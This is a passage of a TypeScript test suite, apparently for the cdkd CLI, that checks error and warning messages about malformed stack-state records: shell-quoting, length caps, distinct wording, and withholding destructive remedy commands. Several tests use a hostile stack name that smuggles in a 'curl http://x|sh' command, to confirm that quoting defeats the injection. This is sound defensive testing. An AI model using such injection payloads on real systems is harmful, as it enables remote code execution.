      expect((thrown as CdkdError).message).toBe(
        malformedOutputsRefusalMessage('MyStack', 'eu-west-1')
      );
    });
  }

  it('FLOOR: a populated, an empty and an ABSENT bag all pass through', () => {
    // The other side of the fence, without which "refuses what it must" says
    // nothing: a guard that threw on everything would satisfy every case
    // above. The absent row is the one that would break real records — a
    // deploy's failure-path save writes `outputs: currentState.outputs`, which
    // `JSON.stringify` DROPS when undefined, and `cdkd scrub` round-trips such
    // a record deliberately.
    expect(() => refuseMalformedOutputs(withOutputs({ A: 'a' }), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(withOutputs({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(withOutputs(undefined), 'S', 'r')).not.toThrow();
  });

  it('refuses on the `outputs` bag ALONE, with the resource map intact', () => {
    // The two containers are independent, so the outputs refusal must not need
    // a damaged resource map to fire — and `refuseMalformedState` must not fire
    // on this record either, or the user would be told not to run
    // `cdkd deploy` for a reason that does not hold. Both directions pinned,
    // because collapsing the two calls into one is the obvious "simplification".
    const s = withOutputs('abcdef');
    expect(() => refuseMalformedState(s, 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();

    const other = state(null);
    other.outputs = { A: 'a' };
    expect(() => refuseMalformedOutputs(other, 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(other, 'S', 'r')).toThrow();
  });

  it('never MUTATES the record it refuses — the evidence is what it protects', () => {
    // A refusal that repaired on its way out would lose exactly what it is
    // there to preserve, and the caller holds the same object.
    const s = withOutputs('abcdef');
    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();
    expect(s.outputs).toBe('abcdef' as unknown as StackState['outputs']);
  });

  it('agrees with the read-only half on every shape, opposite verdicts aside', () => {
    // One predicate under both, so the write-capable and read-only answers
    // cannot come to differ about whether a given record is damaged — only
    // about what to DO. `hasReadableOutputs` is the shared test; this walks the
    // two exported entry points over it.
    for (const [label, value] of UNREADABLE) {
      const readable = hasReadableOutputs(withOutputs(value));
      const repaired = repairMalformedOutputsForReadOnly(withOutputs(value));
      let refused = false;
      try {
        refuseMalformedOutputs(withOutputs(value), 'S', 'r');
      } catch {
        refused = true;
      }
      expect(repaired, label).toBe(!readable);
      expect(refused, label).toBe(!readable);
    }
  });
});

describe('the malformed-outputs REFUSAL text (issue go-to-k/cdkd#3192)', () => {
  it('names the container, the write, and the shared-index blast radius', () => {
    const m = malformedOutputsRefusalMessage('S', 'us-east-1');
    expect(m).toContain(`'outputs'`);
    expect(m).toContain('can WRITE state');
    // The sentence that makes this text different from the `resources`
    // refusal, which is about re-CREATING a stack. Here the resource map is
    // intact and what is at stake is the region-wide exports index.
    expect(m).toContain('exports index');
    // ...and it must NOT borrow the resources text's remedy advice, which
    // would attach a do-not-deploy warning to a stack whose resources are fine.
    expect(m).not.toContain('re-CREATE');
    expect(m).not.toContain(`'resources'`);
  });

  it('shell-quotes a hostile stack name and emits the command LAST', () => {
    const evil = "a'; curl http://x|sh; echo '";
    const m = malformedOutputsRefusalMessage(evil, 'us-east-1');
    // The command this text tells a user to PASTE must not be closable by the
    // name interpolated into it.
    expect(m).not.toContain(`${evil} --stack-region`);
    expect(m).toContain('cdkd state show');
    expect(m.split('\n')).toHaveLength(1);
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
    const controlOnly = String.fromCharCode(0x00, 0x01);
    expect(malformedOutputsRefusalMessage(controlOnly, 'us-east-1')).toContain(UNRENDERABLE);
  });

  it('CAPS a multi-kilobyte name so the remedy command stays on screen', () => {
    // The cap is inherited from this module's own `safeIdentifier` (which in
    // turn uses the shared `truncateCodePoints`), and inheritance is exactly
    // what stops being true when someone inlines a helper — so each new
    // message gets its own case (review of go-to-k/cdkd#3206). A stack name
    // can arrive from an S3 key, so this is reachable rather than theoretical.
    // Asserted as a DISTANCE, not `endsWith`: the template satisfies an
    // endsWith check with or without a cap.
    const long = malformedOutputsRefusalMessage('q'.repeat(5000), 'us-east-1');
    // At the STACK cap (1152 code points, a nested `Parent~Child` chain), not
    // an identifier's 128: the name is printed twice, prose and command, and a
    // legitimate nested name cut shorter names a stack that does not exist.
    expect(long).toContain(`${'q'.repeat(1152)}...`);
    expect(long).not.toContain('q'.repeat(1153));
    expect(long).toContain('cdkd state show');
    expect(long.length).toBeLessThan(3200);
  });
});

/**
 * The three texts issue go-to-k/cdkd#3207 added, and the two refusal helpers
 * that carry two of them.
 *
 * Each is a SEPARATE text for the reason every text in this module is: the
 * CONSEQUENCE of continuing differs, and a borrowed sentence states one that
 * does not happen. The distinctness cases below are what stops a later "these
 * three are nearly identical, merge them" from landing.
 */
describe('the gate-scoped outputs texts (issue go-to-k/cdkd#3207)', () => {
  const HOSTILE = "a'; curl http://x|sh; echo '";
  const CONTROL_ONLY = String.fromCharCode(0x00, 0x01);

  const TEXTS: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
    ['the DESTROY refusal', malformedDestroyOutputsRefusalMessage],
    ['the NESTED-child refusal', malformedNestedChildOutputsRefusalMessage],
    ['the LOCAL warning', malformedLocalOutputsWarning],
  ];

  // The four properties `safeIdentifier`'s note requires of every message in
  // this module. Inheritance is exactly what stops being true when someone
  // inlines a helper, so each new text gets its own row rather than a comment
  // saying it inherits them.
  for (const [label, build] of TEXTS) {
    it(`${label} shell-quotes a hostile name and emits the command LAST, on one line`, () => {
      const m = build(HOSTILE, 'us-east-1');
      expect(m).not.toContain(`${HOSTILE} --stack-region`);
      expect(m).toContain('cdkd state show');
      expect(m.split('\n')).toHaveLength(1);
    });

    it(`${label} renders an identifier that sanitizes to EMPTY as a placeholder`, () => {
      expect(build(CONTROL_ONLY, 'us-east-1')).toContain(UNRENDERABLE);
    });

    it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152), which every
      // builder in this module takes for a stack name; the cross-builder case
      // below asserts the same cap for each occurrence.
      const long = build('q'.repeat(5000), 'us-east-1');
      expect(long).toContain(`${'q'.repeat(1152)}...`);
      expect(long).not.toContain('q'.repeat(1153));
      expect(long).toContain('cdkd state show');
      expect(long.length).toBeLessThan(3200);
    });

    it(`${label} names the container it is about`, () => {
      expect(build('S', 'us-east-1')).toContain(`'outputs'`);
    });
  }

  it('the DESTROY refusal names the SKIPPED check, which is its whole reason', () => {
    const m = malformedDestroyOutputsRefusalMessage('S', 'us-east-1');
    expect(m).toContain('DELETES state');
    // The dangerous direction: a null / number / boolean bag reads as "exports
    // nothing" and the cross-stack protection never runs at all. Without this
    // sentence the text would describe only the fabricating half.
    expect(m).toContain('SKIPS the check');
    expect(m).toContain('imports from');
    // A destroy does not rebuild the bag — it CLEARS it — so borrowing the
    // deploy sentence would state a mechanism that never happens here.
    expect(m).not.toContain('REBUILDS the bag before saving');
  });

  it('the NESTED-child refusal names the PARENT as the record that would be written', () => {
    const m = malformedNestedChildOutputsRefusalMessage('Parent~Child', 'us-east-1');
    expect(m).toContain('nested stack child');
    expect(m).toContain("PARENT's record");
    expect(m).toContain('Fn::GetAtt');
    // The damaged record and the saved record are DIFFERENT stacks here, so
    // the deploy text's blast radius is the wrong one.
    expect(m).not.toContain('shared exports index');
  });

  it('the LOCAL warning says it CONTINUES, and does not claim a refusal', () => {
    const m = malformedLocalOutputsWarning('S', 'us-east-1');
    expect(m).toContain('Continuing with it EMPTY');
    expect(m).toContain('is not the same as the record holding none');
    expect(m).not.toContain('refuses');
    // Not the DIFF warning's text: a local run reports no ADD rows, it
    // SUBSTITUTES, so that sentence would describe output nobody will see.
    expect(m).not.toContain('reported as an ADD');
  });

  it('all five outputs texts are DISTINCT — a borrowed sentence states a wrong consequence', () => {
    const rendered = [
      malformedOutputsRefusalMessage('S', 'r'),
      malformedOutputsWarning('S', 'r'),
      malformedExportSourceWarning('S', 'r'),
      malformedDestroyOutputsRefusalMessage('S', 'r'),
      malformedNestedChildOutputsRefusalMessage('S', 'r'),
      malformedLocalOutputsWarning('S', 'r'),
    ];
    expect(new Set(rendered).size).toBe(rendered.length);
  });
});

describe('the two go-to-k/cdkd#3207 refusal helpers', () => {
  function withOutputs(outputs: unknown): StackState {
    const s = state({ R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} } });
    s.outputs = outputs as StackState['outputs'];
    return s;
  }

  const HELPERS: ReadonlyArray<
    readonly [
      string,
      (s: StackState, n: string, r: string) => void,
      (n: string, r: string) => string,
    ]
  > = [
    ['refuseMalformedOutputsForDestroy', refuseMalformedOutputsForDestroy, malformedDestroyOutputsRefusalMessage],
    [
      'refuseMalformedNestedChildOutputs',
      refuseMalformedNestedChildOutputs,
      malformedNestedChildOutputsRefusalMessage,
    ],
  ];

  for (const [name, refuse, text] of HELPERS) {
    for (const [label, value] of UNREADABLE.filter(([l]) => l !== 'absent')) {
      it(`${name} REFUSES ${label} with the shared code and its OWN text`, () => {
        let thrown: unknown;
        try {
          refuse(withOutputs(value), 'MyStack', 'eu-west-1');
        } catch (err) {
          thrown = err;
        }
        expect(thrown, `a ${label} outputs bag was not refused`).toBeInstanceOf(CdkdError);
        expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
        expect((thrown as CdkdError).message).toBe(text('MyStack', 'eu-west-1'));
      });
    }

    it(`${name} FLOOR: a populated, an empty and an ABSENT bag all pass through`, () => {
      // Without this, "refuses what it must" says nothing — a helper that threw
      // on everything would satisfy every case above while making the command
      // unusable. The ABSENT row is the one that would break real records.
      expect(() => refuse(withOutputs({ A: 'a' }), 'S', 'r')).not.toThrow();
      expect(() => refuse(withOutputs({}), 'S', 'r')).not.toThrow();
      expect(() => refuse(withOutputs(undefined), 'S', 'r')).not.toThrow();
    });

    it(`${name} never MUTATES the record it refuses`, () => {
      const s = withOutputs('abcdef');
      expect(() => refuse(s, 'S', 'r')).toThrow();
      expect(s.outputs).toBe('abcdef' as unknown as StackState['outputs']);
    });

    it(`${name} agrees with hasReadableOutputs on every shape`, () => {
      // ONE predicate under all four entry points, so no two of them can come
      // to different verdicts about the same record — only about what to DO.
      for (const [label, value] of UNREADABLE) {
        const readable = hasReadableOutputs(withOutputs(value));
        let refused = false;
        try {
          refuse(withOutputs(value), 'S', 'r');
        } catch {
          refused = true;
        }
        expect(refused, `${name} / ${label}`).toBe(!readable);
      }
    });
  }
});

/**
 * The `resources` container's two GATE-SCOPED refusals (issue
 * [go-to-k/cdkd#3161](https://github.com/go-to-k/cdkd/issues/3161)) — the
 * `outputs` half's shape, applied to the container `destroy` and `deploy` were
 * the last write-capable readers of.
 */
describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
  const HOSTILE = "a'; curl http://x|sh; echo '";
  const CONTROL_ONLY = String.fromCharCode(0x00, 0x01);

  const TEXTS: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
    ['the DESTROY refusal', malformedDestroyResourcesRefusalMessage],
    ['the DEPLOY refusal', malformedDeployResourcesRefusalMessage],
  ];

  // The same four properties `safeIdentifier`'s note requires of every message
  // in this module, one row per text rather than a comment claiming they are
  // inherited — inheritance is exactly what stops holding when a helper is
  // inlined.
  for (const [label, build] of TEXTS) {
    it(`${label} shell-quotes a hostile name and stays on one line`, () => {
      const m = build(HOSTILE, 'us-east-1');
      expect(m).not.toContain(`${HOSTILE} --stack-region`);
      expect(m).toContain('cdkd state show');
      expect(m.split('\n')).toHaveLength(1);
    });

    it(`${label} names the container it is about`, () => {
      expect(build('S', 'us-east-1')).toContain(`'resources'`);
    });
  }

  /**
   * The sanitize / cap properties are asserted on the DEPLOY text and on the
   * destroy's EXACT arm only, and the split is the point rather than an
   * exemption: the destroy's WITHHOLD arm is reached by exactly the inputs
   * these cases feed (a name that sanitizes to empty, a name past the cap),
   * and that arm deliberately prints NO identity at all — so demanding
   * `UNRENDERABLE` or a capped `q…` there would be demanding the thing it
   * exists not to do. What the withhold arm owes instead is asserted below.
   */
  const SANITIZING: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
    ['the DEPLOY refusal', malformedDeployResourcesRefusalMessage],
    // The destroy's exact arm, reached by keeping the REGION ordinary and the
    // stack name renderable — which is what `malformedStateDetail` renders.
    ['the DESTROY refusal (exact arm)', malformedStateRefusalMessage],
  ];

  for (const [label, build] of SANITIZING) {
    it(`${label} renders an identifier that sanitizes to EMPTY as a placeholder`, () => {
      expect(build(CONTROL_ONLY, 'us-east-1')).toContain(UNRENDERABLE);
    });

    it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152) every builder in
      // this module takes for a stack name; the cross-builder case asserts the
      // same cap for each occurrence.
      const long = build('q'.repeat(5000), 'us-east-1');
      expect(long).toContain(`${'q'.repeat(1152)}...`);
      expect(long).not.toContain('q'.repeat(1153));
      expect(long).toContain('cdkd state show');
      expect(long.length).toBeLessThan(3600);
    });
  }

  /**
   * The WITHHOLD arm's own contract, which is the inverse of the two cases
   * above: having said the printed identity may match another record, it must
   * not then hand over a command built from that identity. An earlier revision
   * kept `malformedStateDetail`'s pasteable
   * `cdkd state show 'prod-api' --stack-region 'us-east-1' --json`, so
   * following the message READ the healthy sibling, returned a clean record,
   * and raised the operator's confidence immediately before the destructive
   * step (review round 2 of go-to-k/cdkd#3332).
   */
  it('the WITHHOLD arm offers no command built from the identity it distrusts', () => {
    for (const [label, stack, region] of [
      ['a trimmed name', 'prod-api ', 'us-east-1'],
      ['a name that sanitizes to empty', CONTROL_ONLY, 'us-east-1'],
      ['a name past the cap', 'q'.repeat(5000), 'us-east-1'],
    ] as const) {
      const m = malformedDestroyResourcesRefusalMessage(stack, region);
      expect(m, label).toContain('does NOT render exactly');
      // The TEMPLATE, not a substitution — the module's own no-identity form.
      expect(m, label).toContain('cdkd state show \'<stack>\' --stack-region \'<region>\' --json');
      expect(m, label).toContain('The state record this command loaded');
      // Strip the no-identity TEMPLATE — it quotes its holes since
      // go-to-k/cdkd#3363 (M4: a bare `<stack>` is a shell redirection) — then
      // refuse the VERB outright.
      //
      // Keying on a following quote, which is what this assertion used to do,
      // was INERT for two of these three rows: `shellQuote` returns
      // `[A-Za-z0-9._/@:+-]+` BARE, so a substituted command for the trimmed
      // `'prod-api '` renders `cdkd state show prod-api --stack-region ...`
      // with no quote anywhere, and the check could not see the very `prod-api`
      // regression the docstring above cites. Only the middle row, whose
      // sanitized name is empty, ever exercised it (go-to-k/cdkd#3439).
      const withoutTemplate = m.replaceAll(
        "cdkd state show '<stack>' --stack-region '<region>' --json",
        ''
      );
      expect(withoutTemplate, `${label}: a substituted show command survived`).not.toContain(
        'cdkd state show'
      );
      expect(withoutTemplate, `${label}: a substituted orphan command`).not.toContain(
        'cdkd state orphan'
      );
      // Stronger still, and independent of the verb: the sanitized spelling is
      // the thing that would aim at the healthy sibling, so it must not appear
      // anywhere in the message. This is what actually reddens on the
      // `prod-api` row.
      const sanitized = safeIdentifierFor(stack);
      if (sanitized !== '') {
        expect(withoutTemplate, `${label}: the sanitized identity leaked`).not.toContain(sanitized);
      }
    }
  });

  it('the DESTROY refusal names the FAST PATH, which is the whole defect', () => {
    const m = malformedDestroyResourcesRefusalMessage('S', 'us-east-1');
    expect(m).toContain('DELETES state');
    expect(m).toContain('empty-stack fast path');
    // The measurement that settles refuse-versus-repair: reading the bag as
    // empty IS the damaging outcome, so "just repair it" is not the safe half.
    expect(m).toContain('Reading the bag as EMPTY is that same outcome');
    // And the answer to go-to-k/cdkd#3161's objection that refusing a CLEANUP
    // command leaves the user stuck.
    expect(m).toContain('cdkd state orphan');
    // Not the generic write-capable text, whose harm is the SAVE.
    expect(m).not.toContain('saving over a record');
  });

  /**
   * The `cdkd state orphan` remedy is a TEMPLATE, never a substituted command,
   * and this is the case that keeps it one.
   *
   * `state orphan` DELETES a record. The `region` the destroy refusal is handed
   * is `state.region ?? ctx.baseRegion`, which WAS record-BODY content
   * `getState` did not check against the key it loaded from —
   * measured 2026-09-17: a record planted at `.../us-east-1/state.json`
   * carrying `"region": "eu-west-1"` rendered a pasteable
   * `cdkd state orphan <stack> --stack-region eu-west-1`, aiming a destructive
   * command at a DIFFERENT region's record for the same stack. That is
   * `stackClause`'s misdirection class, one field over.
   *
   * go-to-k/cdkd#3328 fixed the divergence itself — `getState` normalizes a
   * region-scoped record's `region` to its KEY's and warns — so that operand
   * is now the key's region. THIS CASE IS NOT THEREBY OBSOLETE, which is why
   * it keeps its own parameter: the key's region is an S3 key SEGMENT anyone
   * able to write the bucket can choose, and a legacy record still falls
   * through to `ctx.baseRegion`. The builder takes a region it does not own
   * either way, and the bound below is a claim about the BUILDER.
   *
   * The asymmetry with the `cdkd state show` line in the same message is
   * deliberate: that one READS, and substituting into it is
   * `malformedStateDetail`'s pre-existing behaviour.
   */
  it('spells the DESTRUCTIVE remedy as a template, so a record-supplied region cannot aim it', () => {
    const PLANTED = 'zz-planted-1';
    const m = malformedDestroyResourcesRefusalMessage('MyStack', PLANTED);
    expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
    // Non-vacuity first: the region really is in the message, so the bound
    // below is a POSITION test rather than an absence test.
    expect(m).toContain(PLANTED);
    const orphanAt = m.indexOf('cdkd state orphan');
    expect(orphanAt, 'the orphan remedy is gone; this case is asserting nothing').toBeGreaterThan(
      -1
    );
    // The discriminating half. The planted region may appear in the prose and
    // in the read-only `state show` remedy, but nothing at or after the
    // destructive command may carry it — `lastIndexOf` is what makes that a
    // bound on EVERY occurrence rather than on the first.
    expect(
      m.lastIndexOf(PLANTED),
      'a record-supplied region was substituted into, or after, the destructive remedy'
    ).toBeLessThan(orphanAt);
  });

  /**
   * The template alone is not enough, because the name a reader types into it
   * comes from the clause ABOVE — and `safeIdentifier` composes `displaySafe`,
   * which TRIMS. A record keyed `'prod-api '` opens the message as
   * `State for 'prod-api' (...)`, byte-identical to a HEALTHY sibling, so an
   * operator orphaning "the record the line above names" deletes the intact
   * one. The remedy is therefore GATED on both identifiers rendering EXACTLY.
   */
  const INEXACT: ReadonlyArray<readonly [string, string, string]> = [
    ['a TRIMMED stack name', 'prod-api ', 'us-east-1'],
    ['a stack name with a SUBSTITUTED character', 'pro\u0000d', 'us-east-1'],
    // Past STACK_REF_MAX_CODE_POINTS (1152), the stack cap every text in this
    // module uses and the one THIS message's exactness gate measures against —
    // not a region's 128. A 400-character name
    // renders exactly here on purpose: an ordinary multi-level nested child
    // runs past 150 code points, and truncating one put a HEALTHY record in
    // the withhold arm (review round 2 of go-to-k/cdkd#3332).
    ['a TRUNCATED stack name', `${'q'.repeat(5000)}`, 'us-east-1'],
    ['a TRIMMED region', 'prod-api', ' us-east-1'],
    // Past a REGION's cap (128), which `malformedStateDetail` renders it at, so
    // 128 is what "renders exactly" means for the region half of the gate — a
    // gate measuring the region at the stack cap would name this one.
    ['a TRUNCATED region', 'prod-api', 'r'.repeat(129)],
  ];

  for (const [label, stack, region] of INEXACT) {
    it(`withholds the removal target for ${label}`, () => {
      const m = malformedDestroyResourcesRefusalMessage(stack, region);
      expect(
        m,
        'a record whose identity does not render exactly still got a removal target, so the ' +
          'operator can be sent to a healthy same-rendering record'
      ).not.toContain('cdkd state orphan');
      expect(m).toContain('does NOT render exactly');
      expect(m).toContain('cdkd state list --long');
    });
  }

  /**
   * The destroy refusal is THROWN through a caller that classifies
   * "already deleted" by SUBSTRING. `NestedStackProvider.delete` raises it for
   * a malformed CHILD record, and the parent's delete loop — like the deploy
   * engine's — reads `does not exist` / `was not found` / `NoSuchEntity` and
   * friends as an idempotent success, DROPS the state row and reports the
   * child deleted. That is precisely the data loss this guard exists to stop,
   * reached through the message instead of through the bag.
   *
   * `src/provisioning/nested-stack-messages.ts` records the same rule for the
   * other text thrown down that path. Pinned on the TEMPLATE, which is the
   * half a later reword can break; a hostile IDENTITY is a separate residual,
   * bounded because a child's name is `<parent>~<logicalId>` and neither half
   * can contain a space.
   */
  it('contains no phrase the callers read as ALREADY-DELETED', () => {
    const ALREADY_DELETED = [
      'does not exist',
      'was not found',
      'not found',
      'No policy found',
      'NoSuchEntity',
      'NotFoundException',
      'ResourceNotFoundException',
    ];
    // Both arms of the exactness gate, since they are different texts.
    for (const [label, m] of [
      ['exact', malformedDestroyResourcesRefusalMessage('MyStack', 'us-east-1')],
      ['withheld', malformedDestroyResourcesRefusalMessage('My Stack ', 'us-east-1')],
    ] as const) {
      for (const phrase of ALREADY_DELETED) {
        expect(
          m.includes(phrase),
          `the ${label} destroy refusal contains ${JSON.stringify(phrase)}, which a parent's ` +
            `delete loop reads as "already deleted" — it would DROP the child's state row and ` +
            `report the nested stack destroyed`
        ).toBe(false);
      }
    }
  });

  it('measures exactness against the STATE-RECORD cap, not a region-sized 128', () => {
    // The boundary, both sides. Without the lower row a cap regression to 128
    // passes every case above; without the upper one the cap could vanish
    // entirely and a planted multi-kilobyte name would still be named.
    const ordinary =
      'MyProductionRootStack~InnerServiceNestedStackInnerServiceNestedStackResourceB4B2B7C9~LeafWorkerNestedStackLeafWorkerNestedStackResource7F3A1D22';
    expect(ordinary.length, 'the probe name no longer exceeds 128').toBeGreaterThan(128);
    expect(
      malformedDestroyResourcesRefusalMessage(ordinary, 'us-east-1'),
      'an ordinary nested-child name is now withheld, so the fallback is the common path'
    ).toContain('cdkd state orphan');
    expect(
      malformedDestroyResourcesRefusalMessage('q'.repeat(2000), 'us-east-1'),
      'a multi-kilobyte name is named, so the cap has stopped bounding anything'
    ).not.toContain('cdkd state orphan');
    // The EDGE itself, so a gate measured against some other cap between the
    // two rows above cannot pass: exactly the cap is named, one past is not.
    expect(
      malformedDestroyResourcesRefusalMessage('q'.repeat(1152), 'us-east-1'),
      'a name exactly at STACK_REF_MAX_CODE_POINTS is withheld'
    ).toContain('cdkd state orphan');
    expect(
      malformedDestroyResourcesRefusalMessage('q'.repeat(1153), 'us-east-1'),
      'a name one past STACK_REF_MAX_CODE_POINTS is named'
    ).not.toContain('cdkd state orphan');
  });

  it('keeps the removal target for an EXACT identity — the control for the gate', () => {
    // Without this, a gate that withheld unconditionally would satisfy every
    // case above while making the remedy unreachable.
    const m = malformedDestroyResourcesRefusalMessage('prod-api', 'us-east-1');
    expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
    expect(m).not.toContain('does NOT render exactly');
    // The region's own edge, from below: exactly its cap still renders
    // exactly, so a gate measuring the region at a SMALLER cap cannot pass.
    expect(
      malformedDestroyResourcesRefusalMessage('prod-api', 'r'.repeat(128)),
      'a region exactly at its 128 cap is withheld'
    ).toContain('cdkd state orphan');
  });

  it('the DEPLOY refusal names the RE-CREATE, and holds under --dry-run', () => {
    const m = malformedDeployResourcesRefusalMessage('S', 'us-east-1');
    expect(m).toContain('re-provisions a stack that already exists');
    expect(m).toContain("under '--dry-run' too");
    expect(m).toContain('Nothing was provisioned and no state was written');
    expect(m).toContain("'cdkd diff' previews the stack with this map read as EMPTY");
    // Not the destroy text: a deploy reaches no fast path, and pointing a
    // deploy refusal at `cdkd state orphan` would advise deleting the record
    // it is refusing to act on.
    expect(m).not.toContain('empty-stack fast path');
    expect(m).not.toContain('cdkd state orphan');
  });

  it('all three resources texts are DISTINCT — a borrowed sentence states a wrong consequence', () => {
    const rendered = [
      malformedStateRefusalMessage('S', 'r'),
      malformedDestroyResourcesRefusalMessage('S', 'r'),
      malformedDeployResourcesRefusalMessage('S', 'r'),
    ];
    expect(new Set(rendered).size).toBe(rendered.length);
  });
});

describe('the two go-to-k/cdkd#3161 refusal helpers', () => {
  const HELPERS: ReadonlyArray<
    readonly [
      string,
      (s: StackState, n: string, r: string) => void,
      (n: string, r: string) => string,
    ]
  > = [
    [
      'refuseMalformedResourcesForDestroy',
      refuseMalformedResourcesForDestroy,
      malformedDestroyResourcesRefusalMessage,
    ],
    [
      'refuseMalformedResourcesForDeploy',
      refuseMalformedResourcesForDeploy,
      malformedDeployResourcesRefusalMessage,
    ],
  ];

  for (const [name, refuse, text] of HELPERS) {
    // The FULL table here, `absent` included: unlike `outputs`, an absent
    // `resources` key is a defect rather than a record cdkd writes on purpose.
    for (const [label, value] of UNREADABLE) {
      it(`${name} REFUSES ${label} with the shared code and its OWN text`, () => {
        let thrown: unknown;
        try {
          refuse(state(value), 'MyStack', 'eu-west-1');
        } catch (err) {
          thrown = err;
        }
        expect(thrown, `a ${label} resources bag was not refused`).toBeInstanceOf(CdkdError);
        expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
        expect((thrown as CdkdError).message).toBe(text('MyStack', 'eu-west-1'));
      });
    }

    it(`${name} FLOOR: a populated and a legitimately EMPTY bag pass through`, () => {
      // Without this, "refuses what it must" says nothing — a helper that threw
      // on everything would satisfy every case above while making the command
      // unusable. The `{}` row is the one that would break real records: an
      // empty stack and an unreadable bag both COUNT zero, so only the shape
      // test separates them.
      expect(() =>
        refuse(state({ A: { physicalId: 'p', resourceType: 'T', properties: {} } }), 'S', 'r')
      ).not.toThrow();
      expect(() => refuse(state({}), 'S', 'r')).not.toThrow();
    });

    it(`${name} never MUTATES the record it refuses`, () => {
      const s = state('abcdef');
      expect(() => refuse(s, 'S', 'r')).toThrow();
      expect(s.resources).toBe('abcdef' as unknown as StackState['resources']);
    });

    it(`${name} agrees with hasReadableResources on every shape`, () => {
      // ONE predicate under all three entry points, so no two of them can come
      // to different verdicts about the same record — only about what to DO.
      for (const [label, value] of [...UNREADABLE, ['an empty map', {}] as const]) {
        const readable = hasReadableResources(state(value));
        let refused = false;
        try {
          refuse(state(value), 'S', 'r');
        } catch {
          refused = true;
        }
        expect(refused, `${name} / ${label}`).toBe(!readable);
      }
    });

    it(`${name} marks the refusal non-retryable`, () => {
      // Both fire inside a `withRetry` path — a nested child's destroy reaches
      // `runDestroyForStack` through `NestedStackProvider.delete`, and a nested
      // child's deploy runs inside the parent's `withRetry(provider.create)`.
      // Without the marker the SUBSTRING classifiers decide, and a
      // caller-supplied stack name can carry a live retryable pattern into the
      // message. Issue #1838's shape.
      let thrown: unknown;
      try {
        refuse(state(null), 'S', 'r');
      } catch (e) {
        thrown = e;
      }
      expect(thrown, 'the refusal did not fire, so the marker assertion is vacuous').toBeDefined();
      expect(isMarkedNonRetryable(thrown)).toBe(true);
    });
  }
});

describe('the malformed export-SOURCE warning (issue go-to-k/cdkd#3192)', () => {
  it('says the rebuild CONTINUES and names the symptom a reader will meet', () => {
    const w = malformedExportSourceWarning('Producer', 'us-east-1');
    expect(w).toContain('Producer');
    expect(w).toContain(`'exportNames'`);
    // The distinguishing sentence: the failure shows up in a DIFFERENT stack,
    // naming the consumer, so this line is the only place the damaged producer
    // is named at all.
    expect(w).toContain('CONSUMER');
    expect(w).toContain('Continuing');
    // And it must not read as a refusal — the index serves every producer in
    // the region and aborting over one record would take them all down.
    expect(w).not.toContain('refuses');
  });

  it('is a DIFFERENT text from its two outputs siblings', () => {
    // Three texts for one container is deliberate; a future edit that
    // collapses any pair loses the consequence each states.
    const source = malformedExportSourceWarning('S', 'us-east-1');
    expect(source).not.toBe(malformedOutputsWarning('S', 'us-east-1'));
    expect(source).not.toBe(malformedOutputsRefusalMessage('S', 'us-east-1'));
    expect(malformedOutputsWarning('S', 'us-east-1')).not.toBe(
      malformedOutputsRefusalMessage('S', 'us-east-1')
    );
  });

  it('shell-quotes a hostile identifier and stays on one line', () => {
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedExportSourceWarning(evil, 'us-east-1');
    expect(w).not.toContain(`${evil} --stack-region`);
    expect(w.split('\n')).toHaveLength(1);
    expect(malformedExportSourceWarning(String.fromCharCode(0x00), 'r')).toContain(UNRENDERABLE);
  });

  it('CAPS a multi-kilobyte producer name too', () => {
    // Same reason as the refusal's own cap case, and this one matters more:
    // the producer name here comes off an S3 KEY during a rebuild, with no
    // user in the loop to have typed it.
    const long = malformedExportSourceWarning('q'.repeat(5000), 'us-east-1');
    // At the STACK cap (1152 code points, a nested `Parent~Child` chain), not
    // an identifier's 128: the name is printed twice, prose and command, and a
    // legitimate nested name cut shorter names a stack that does not exist.
    expect(long).toContain(`${'q'.repeat(1152)}...`);
    expect(long).not.toContain('q'.repeat(1153));
    expect(long).toContain('cdkd state show');
    expect(long.length).toBeLessThan(3200);
  });
});

describe('the malformed-outputs warning (issue go-to-k/cdkd#3189)', () => {
  it('names the container and the consequence a DIFF has, not a renderer\x27s', () => {
    const w = malformedOutputsWarning('S', 'us-east-1');
    expect(w).toContain(`'outputs'`);
    // The sentence that makes this text different from its two siblings. A
    // reader who sees ADD rows for outputs the stack already has must be told
    // the comparison lost its left-hand side; `malformedRenderedContainersWarning`
    // says the view "shows no rows there", which is false of a diff.
    expect(w).toContain('is reported as an ADD');
    expect(w).not.toContain('this view shows no rows');
    // ...and NOT the resources text's deploy/destroy prohibition: the resource
    // SET is readable here, so borrowing it would attach a
    // re-create-the-world warning to a record whose resources are intact.
    expect(w).not.toContain(`Do NOT run 'cdkd deploy'`);
    // The fabrication clause is CONDITIONAL, not an assertion about this
    // record. Five shapes reach this text and only two of them invent rows —
    // `null`, `42` and `true` yield none — so an unconditional "INVENTS a
    // REMOVE row per character" would diagnose a harm that did not occur for
    // three of them (review of go-to-k/cdkd#3194).
    expect(w).toContain('Where the stored value is a string or a list');
    expect(w).toContain('yields no comparison at all');
  });

  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
    // A planted stack name that would close the quoting and append its own
    // command to the line this text tells the user to RUN — a stack name
    // reaches this path from an S3 key, so it is not trusted.
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedOutputsWarning(evil, 'us-east-1');
    const start = w.indexOf('cdkd state show ');
    expect(start).toBeGreaterThan(-1);
    const command = w.slice(start);
